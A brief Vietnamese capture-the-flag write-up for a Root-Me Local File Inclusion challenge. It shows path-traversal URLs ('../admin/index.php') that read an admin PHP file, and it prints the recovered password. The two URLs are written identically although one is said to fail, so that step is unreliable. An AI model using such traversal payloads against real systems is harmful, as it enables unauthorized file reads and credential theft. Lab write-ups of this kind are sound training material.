# root-me/Local File Inclusion/Abbreviated LFI

## 15/7/2025 

### Đề:

Get in the admin section.

### Giải:

Thư mục admin cùng thư mục root -> thử:

- `http://challenge01.root-me.org/web-serveur/ch16/?files=sysadm&f=../admin/index.php` (ko đc)
- `http://challenge01.root-me.org/web-serveur/ch16/?files=sysadm&f=../admin/index.php` (ra file)

```php
$realm = 'PHP Restricted area';
$users = array('admin' => 'OpbNJ60xYpvAQU8');
```

Ra pass.
